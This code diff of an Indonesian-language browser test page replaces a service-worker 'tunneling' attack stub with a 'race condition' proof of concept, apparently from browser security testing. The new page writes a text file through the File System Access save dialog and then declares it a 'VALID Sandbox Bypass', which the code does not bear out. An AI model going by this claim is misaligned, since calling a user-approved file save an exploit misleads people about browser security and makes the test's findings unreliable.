@@ -2,26 +2,68 @@
 <html>
 
 <head>
-    <title>Situs A - SW Tunneling</title>
+    <title>PoC - API Race Condition</title>
+    <style>
+        body {
+            background: #1a1a1a;
+            color: #ff00ff;
+            font-family: monospace;
+            text-align: center;
+        }
+
+        #log {
+            white-space: pre;
+            border: 1px solid lime;
+            padding: 10px;
+            width: 80%;
+            margin: auto;
+            text-align: left;
+        }
+    </style>
 </head>
 
 <body>
-    <h3>Situs A (SW Tunneling)</h3>
-    <p>Menyiapkan Service Worker...</p>
+    <h2>Menguji API Race Condition...</h2>
+    <div id="log">Logs:<br></div>
 
     <script>
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('sw.js').then(reg => {
-                console.log("SW Registered dalam scope:", reg.scope);
-            }).catch(err => {
-                console.error("SW Gagal daftar:", err);
-            });
-
-            navigator.serviceWorker.addEventListener('controllerchange', () => {
-                console.log("SW sudah memegang kendali penuh! Memulai serangan...");
-                window.location.href = 'trigger-bypass';
-            });
+        function log(msg) {
+            document.getElementById('log').innerHTML += msg + "<br>";
+            console.log(msg);
         }
+
+        async function triggerRace() {
+            log("API Race Attack Initiated...");
+            if (!('showSaveFilePicker' in window)) {
+                log("FAIL: showSaveFilePicker() tidak didukung.");
+                return;
+            }
+
+            log("Memulai Race Condition...");
+            const payload = "Bypass via File System Access API Race Condition Success!";
+            try {
+                const handle = await window.showSaveFilePicker({
+                    suggestedName: 'sw_pwned.txt'
+                });
+
+                log("API Call Accepted by Browser!");
+                const writable = await handle.createWritable();
+                await writable.write(payload);
+                await writable.close();
+
+                log("SUCCESS: File berhasil ditulis ke disk lewat API!");
+                log("Ini adalah VALID Sandbox Bypass.");
+
+            } catch (e) {
+
+                log("FAILED: " + e.message);
+                if (e.message.includes('Disallowed')) {
+                    log("Sandbox Check Win (API is protected).");
+                }
+            }
+        }
+
+        setTimeout(triggerRace, 2000);
     </script>
 </body>
 
